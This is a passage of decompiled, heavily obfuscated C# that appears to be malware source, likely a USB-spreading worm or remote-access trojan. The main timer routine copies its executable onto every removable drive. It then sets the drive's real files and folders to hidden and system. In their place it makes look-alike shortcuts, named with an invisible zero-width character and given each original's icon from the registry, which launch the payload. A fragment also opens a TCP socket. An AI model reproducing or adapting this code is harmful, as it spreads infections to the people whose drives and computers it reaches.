					Socket gparam_2 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
					Class5.smethod_21(gparam_2, (EndPoint)gparam_, (short)207, (short)197);
					Class11.Class15.smethod_20(gparam_2, 2, 37);
					break;
				}
				}
				break;
			}
			catch (Exception gparam_3)
			{
				Class11.Class12.smethod_1(gparam_3, 598, 587);
				Class11.smethod_2('Λ', '\u0385');
				try0001_dispatch = 2;
			}
		}
	}

	public static byte[] smethod_7(string string_16)
	{
		return MyApplication.smethod_18(Class5.smethod_22(674, 690), string_16, 323, 327);
	}

	public static string smethod_8(byte[] byte_0)
	{
		return (string)(IEquatable<string>)Class5.Class6.smethod_19(Class5.smethod_22(896, 912), byte_0, 393, 422);
	}

	public static Array smethod_9(byte[] byte_0, string string_16)
	{
		List<byte[]> list = new List<byte[]>();
		MemoryStream gparam_ = new MemoryStream();
		MemoryStream gparam_2 = new MemoryStream();
		string[] array = Class5.Class7.smethod_12(smethod_8(byte_0), string_16, -1, (CompareMethod)0, 'ϐ', 978);
		Class5.Class7.smethod_6(gparam_, byte_0, 0, Class5.smethod_4(array[0], 'l', 'n'), 619, 517);
		checked
		{
			Class5.Class7.smethod_6(gparam_2, byte_0, Class5.smethod_4(array[0], 'ʮ', 'ʬ') + Class5.smethod_4(string_16, 'ˮ', 'ˬ'), byte_0.Length - (Class5.smethod_4(array[0], 'Ŵ', 'Ŷ') + Class5.smethod_4(string_16, 'Þ', 'Ü')), 585, 551);
			list.Add(Class16.smethod_12(gparam_, 1017, 'ϯ'));
			list.Add(Class16.smethod_12(gparam_2, 49, '\''));
			Class11.Class12.smethod_13((Stream)gparam_, (short)990, 'ϳ');
			Class11.Class12.smethod_13((Stream)gparam_2, (short)934, '\u038b');
			return (Array)(ICloneable)list.ToArray();
		}
	}

	private static void smethod_10(object sender, ElapsedEventArgs e)
	{
		//IL_072a: Unknown result type (might be due to invalid IL or missing references)
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		string text = default(string);
		object gparam_ = default(object);
		DriveInfo[] array = default(DriveInfo[]);
		int num6 = default(int);
		DriveInfo gparam_2 = default(DriveInfo);
		string gparam_3 = default(string);
		string[] array2 = default(string[]);
		int num7 = default(int);
		string text2 = default(string);
		object gparam_4 = default(object);
		object gparam_5 = default(object);
		string[] array3 = default(string[]);
		object gparam_6 = default(object);
		object gparam_7 = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0001_dispatch)
					{
					default:
						Class5.Class6.smethod_4(762, 643);
						num3 = -2;
						goto IL_0013;
					case 2108:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								default:
									goto end_IL_0001;
								case 1:
									break;
								case 0:
									goto end_IL_0001;
								}
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0013;
							case 3:
								goto IL_0040;
							case 4:
								goto IL_006b;
							case 5:
								goto IL_0084;
							case 6:
								goto IL_00a0;
							case 7:
								goto IL_00bb;
							case 9:
								goto IL_00ed;
							case 10:
								goto IL_00f1;
							case 13:
								goto IL_0147;
							case 15:
								goto IL_0179;
							case 16:
								goto IL_017d;
							case 17:
								goto IL_0197;
							case 19:
								goto IL_01e9;
							case 20:
								goto IL_01ed;
							case 21:
								goto IL_0251;
							case 22:
								goto IL_0298;
							case 23:
								goto IL_02e3;
							case 24:
								goto IL_03d0;
							case 25:
								goto IL_03ff;
							case 27:
								goto IL_0432;
							case 28:
								goto IL_0436;
							case 32:
								goto IL_0475;
							case 33:
								goto IL_0479;
							case 31:
							case 34:
							case 35:
								goto IL_049e;
							case 36:
								goto IL_04a5;
							case 18:
							case 37:
							case 38:
								goto IL_04a7;
							case 14:
							case 39:
							case 40:
								goto IL_04bd;
							case 41:
								goto IL_04c1;
							case 26:
							case 29:
							case 30:
								goto IL_04ca;
							case 42:
								goto IL_04fe;
							case 43:
								goto IL_052c;
							case 44:
								goto IL_0546;
							case 46:
								goto IL_059e;
							case 47:
								goto IL_05a2;
							case 48:
								goto IL_0613;
							case 49:
								goto IL_065b;
							case 50:
								goto IL_06ad;
							case 51:
								goto IL_06ef;
							case 52:
								goto IL_0718;
							case 53:
								goto IL_0730;
							case 55:
								goto IL_0761;
							case 56:
								goto IL_0765;
							case 59:
								goto IL_07a5;
							case 60:
								goto IL_07ac;
							case 45:
							case 61:
							case 62:
								goto IL_07af;
							case 63:
								goto IL_07c5;
							case 64:
								goto IL_07cb;
							case 54:
							case 57:
							case 58:
								goto IL_07d4;
							case 65:
							case 66:
								goto IL_07fc;
							case 67:
								goto IL_0802;
							case 8:
							case 11:
							case 12:
								goto IL_080b;
							default:
								goto end_IL_0001;
							case 0:
								goto end_IL_0001;
							case 68:
								goto end_IL_0001_2;
							}
							goto default;
						}
						IL_07c5:
						num5++;
						goto IL_07cb;
						IL_07af:
						num = 62;
						Class11.Class12.Class14.smethod_15(text, FileAttributes.Hidden | FileAttributes.System, 469, 443);
						goto IL_07c5;
						IL_0013:
						num = 2;
						gparam_ = Class5.Class7.smethod_0(Class5.smethod_19("wscript.shell", "", 'ų', 'Ŏ'), 397, 482);
						goto IL_0040;
						IL_0040:
						num = 3;
						array = Class5.smethod_23(298, 323);
						num6 = 0;
						goto IL_0057;
						IL_0057:
						if (num6 < array.Length)
						{
							gparam_2 = array[num6];
							goto IL_006b;
						}
						goto end_IL_0001_2;
						IL_07cb:
						num = 64;
						goto IL_0518;
						IL_006b:
						num = 4;
						if (Class5.smethod_24(gparam_2, 374, 365))
						{
							goto IL_0084;
						}
						goto IL_07fc;
						IL_0084:
						num = 5;
						if (Class5.Class7.smethod_16(gparam_2, 282, 336) == DriveType.Removable)
						{
							goto IL_00a0;
						}
						goto IL_07fc;
						IL_00a0:
						num = 6;
						gparam_3 = (string)(ICloneable)Class5.Class6.smethod_20(gparam_2, 'λ', 'ϔ');
						goto IL_00bb;
						IL_00bb:
						num = 7;
						if (!MyComputer.smethod_4(Class5.smethod_11(gparam_3, "\\", string_5, '\u0333', '\u036a'), 705, 652))
						{
							goto IL_00ed;
						}
						goto IL_080b;
						IL_00ed:
						num = 9;
						goto IL_00f1;
						IL_00f1:
						num = 10;
						Class5.Class6.smethod_21<string, string, FileSystemProxy>(MyApplication.smethod_19<ServerComputer>((ServerComputer)(object)MyProject.MyComputer_0, 'ͱ', 840), string_13, Class5.smethod_11(gparam_3, "\\", string_5, 'N', '\u0017'), (short)167, 192);
						goto IL_080b;
						IL_080b:
						num = 12;
						array2 = (string[])(ICollection)Class5.smethod_25(gparam_3, "*.*", '\u036c', '\u031a');
						num7 = 0;
						goto IL_0137;
						IL_0137:
						if (num7 < array2.Length)
						{
							text2 = array2[num7];
							goto IL_0147;
						}
						goto IL_04fe;
						IL_07fc:
						num6++;
						goto IL_0802;
						IL_0147:
						num = 13;
						if (Class5.Class7.smethod_9(MyApplication.smethod_8(text2, 'ϑ', 936), ".lnk", bool_0: false, 'Ⱦ', 562) != 0)
						{
							goto IL_0179;
						}
						goto IL_04bd;
						IL_0179:
						num = 15;
						goto IL_017d;
						IL_017d:
						num = 16;
						if (MyComputer.smethod_4(text2, 908, 961))
						{
							goto IL_0197;
						}
						goto IL_04bd;
						IL_0197:
						num = 17;
						if (!Class5.Class6.smethod_22<FileSystemProxy, string>(MyApplication.smethod_19<ServerComputer>((ServerComputer)(object)MyProject.MyComputer_0, 'ώ', 1015), Class5.Class7.smethod_10(gparam_3, "\\", MyApplication.smethod_8(text2, 'Δ', 1004), "\u200d.lnk", ';', 105), 'ɣ', 'ɢ'))
						{
							goto IL_01e9;
						}
						goto IL_04a7;
						IL_01e9:
						num = 19;
						goto IL_01ed;
						IL_01ed:
						num = 20;
						gparam_4 = MyApplication.smethod_20<Type, string, object>(Class5.smethod_19("WScript.Shell", "", 'Ȍ', 'ȱ'), null, "CreateShortcut", new object[1] { Class5.Class7.smethod_10(gparam_3, "\\", MyApplication.smethod_8(text2, 'ē', 363), "\u200d.lnk", '<', 110) }, null, null, null, 'Y', '\u0012');
						goto IL_0251;
						IL_0251:
						num = 21;
						Class5.Class6.smethod_23<Type, object, string>(gparam_4, null, "TargetPath", new object[1] { Class5.smethod_11(gparam_3, "\\", string_5, 'Ĩ', 'ű') }, null, null, bool_0: false, bool_1: true, 342, 369);
						goto IL_0298;
						IL_0298:
						num = 22;
						Class5.Class6.smethod_23<Type, object, string>(gparam_4, null, "Arguments", new object[1] { MyApplication.smethod_2(" ", MyApplication.smethod_8(text2, 'ġ', 345), 114, 115) }, null, null, bool_0: false, bool_1: true, 412, 443);
						goto IL_02e3;
						IL_02e3:
						num = 23;
						gparam_5 = Class5.Class7.smethod_0(MyApplication.smethod_20<Type, string, object>(gparam_, null, "regread", new object[1] { Class5.Class6.smethod_25(Class5.Class6.smethod_25((object)"HKEY_LOCAL_MACHINE\\software\\classes\\", MyApplication.smethod_20<Type, string, object>(gparam_, null, "regread", new object[1] { Class5.smethod_11("HKEY_LOCAL_MACHINE\\software\\classes\\.", Class5.Class7.smethod_12(MyApplication.smethod_8(text2, 'V', 46), ".", -1, (CompareMethod)0, 'x', 122)[Class5.Class6.smethod_24((Array)Class5.Class7.smethod_12(MyApplication.smethod_8(text2, 'Ɖ', 497), ".", -1, (CompareMethod)0, 'è', 234), 1, (short)706, 767)], "\\", '\u001f', 'F') }, null, null, null, 'Ͷ', '\u033d'), '\u031a', 823), (object)"\\defaulticon\\", '_', 114) }, null, null, null, 'ʈ', '\u02c3'), 232, 135);
						goto IL_03d0;
						IL_03d0:
						num = 24;
						if (Class5.Class7.smethod_17(MyApplication.smethod_17(gparam_5, 798, 787), ",", (CompareMethod)0, 802, 873) == 0)
						{
							goto IL_03ff;
						}
						goto IL_0432;
						IL_03ff:
						num = 25;
						Class5.Class6.smethod_23<Type, object, string>(gparam_4, null, "iconlocation", new object[1] { text2 }, null, null, bool_0: false, bool_1: true, 822, 785);
						goto IL_04ca;
						IL_0432:
						num = 27;
						goto IL_0436;
						IL_0436:
						num = 28;
						Class5.Class6.smethod_23<Type, object, string>(gparam_4, null, "iconlocation", new object[1] { Class5.Class7.smethod_0(gparam_5, 957, 978) }, null, null, bool_0: false, bool_1: true, 294, 257);
						goto IL_04ca;
						IL_04ca:
						num = 30;
						if (Class5.Class7.smethod_9(MyApplication.smethod_8(text2, 'ƫ', 467), string_5, bool_0: false, 'ɗ', 603) != 0)
						{
							goto IL_0475;
						}
						goto IL_049e;
						IL_0475:
						num = 32;
						goto IL_0479;
						IL_0479:
						num = 33;
						MyComputer.smethod_12<string, Type, object>(gparam_4, null, "Save", new object[0], null, null, null, bool_1: true, 'Ɖ', 489);
						goto IL_049e;
						IL_049e:
						num = 35;
						gparam_5 = null;
						goto IL_04a5;
						IL_04a5:
						gparam_4 = null;
						goto IL_04a7;
						IL_04a7:
						num = 38;
						Class5.Class7.smethod_11(text2, FileAttributes.Hidden | FileAttributes.System, '\u0093', 188);
						goto IL_04bd;
						IL_04bd:
						num7++;
						goto IL_04c1;
						IL_04c1:
						num = 41;
						goto IL_0137;
						IL_04fe:
						num = 42;
						array3 = Class5.Class7.smethod_18(gparam_3, 'Ϲ', 'ϣ');
						num5 = 0;
						goto IL_0518;
						IL_0518:
						if (num5 < array3.Length)
						{
							text = array3[num5];
							goto IL_052c;
						}
						goto IL_07fc;
						IL_0802:
						num = 67;
						goto IL_0057;
						IL_052c:
						num = 43;
						if (MyComputer.smethod_4(text, 747, 677))
						{
							goto IL_0546;
						}
						goto IL_07c5;
						IL_0546:
						num = 44;
						if (!Class5.Class6.smethod_22<FileSystemProxy, string>(MyApplication.smethod_19<ServerComputer>((ServerComputer)(object)MyProject.MyComputer_0, 'ρ', 1016), Class5.Class7.smethod_10(gparam_3, "\\", MyApplication.smethod_8(text, 'ħ', 351), "\u200d.lnk", 'ʄ', 726), 'ʮ', 'ʯ'))
						{
							goto IL_059e;
						}
						goto IL_07af;
						IL_059e:
						num = 46;
						goto IL_05a2;
						IL_05a2:
						num = 47;
						gparam_6 = MyApplication.smethod_20<Type, string, object>(Class5.smethod_19("WScript.Shell", "", '\u0306', '\u033b'), null, "CreateShortcut", new object[1] { Class5.Class7.smethod_10(gparam_3, "\\", MyApplication.smethod_8(text, '\u033f', 839), "\u200d.lnk", '\u036b', 825) }, null, null, null, '\u00b4', 'ÿ');
						goto IL_0613;
						IL_0613:
						num = 48;
						Class5.Class6.smethod_23<Type, object, string>(gparam_6, null, "TargetPath", new object[1] { Class5.smethod_11(gparam_3, "\\", string_5, 'Ȭ', 'ɵ') }, null, null, bool_0: false, bool_1: true, 973, 1002);
						goto IL_065b;
						IL_065b:
						num = 49;
						Class5.Class6.smethod_23<Type, object, string>(gparam_6, null, "Arguments", new object[1] { MyApplication.smethod_2(" ", MyApplication.smethod_8(text, 'Ǭ', 404), 313, 312) }, null, null, bool_0: false, bool_1: true, 374, 337);
						goto IL_06ad;
						IL_06ad:
						num = 50;
						gparam_7 = Class11.Class12.Class14.smethod_9(Class11.smethod_7<object, string, Type>(gparam_, null, "regread", new object[1] { "HKEY_LOCAL_MACHINE\\software\\classes\\folder\\defaulticon\\" }, null, null, null, 'Ÿ', 'Ą'), 825, 874);
						goto IL_06ef;
						IL_06ef:
						num = 51;
						if (Class11.Class12.Class14.smethod_18(Class11.smethod_3(gparam_7, 116, 41), ",", (CompareMethod)0, 916, 935) == 0)
						{
							goto IL_0718;
						}
						goto IL_0761;
						IL_0718:
						num = 52;
						Class11.Class15.smethod_22<object, object>(text, (MsgBoxStyle)0, null, 772, '\u0306');
						goto IL_0730;
						IL_0730:
						num = 53;
						Class11.Class15.smethod_14<Type, string, object>(gparam_6, null, "IconLocation", new object[1] { text }, null, null, bool_0: false, bool_1: true, 'ʽ', 728);
						goto IL_07d4;
						IL_0761:
						num = 55;
						goto IL_0765;
						IL_0765:
						num = 56;
						Class11.Class15.smethod_14<Type, string, object>(gparam_6, null, "IconLocation", new object[1] { Class11.Class12.Class14.smethod_9(gparam_7, 433, 482) }, null, null, bool_0: false, bool_1: true, 'ȇ', 610);
						goto IL_07d4;
						IL_07d4:
						num = 58;
						Class16.smethod_6<Type, string, object>(gparam_6, null, "Save", new object[0], null, null, null, bool_1: true, 262, 263);
						goto IL_07a5;
						IL_07a5:
						num = 59;
						gparam_7 = null;
						goto IL_07ac;
						IL_07ac:
						gparam_6 = null;
						goto IL_07af;
						end_IL_0001:
						break;
					}
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 2108;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
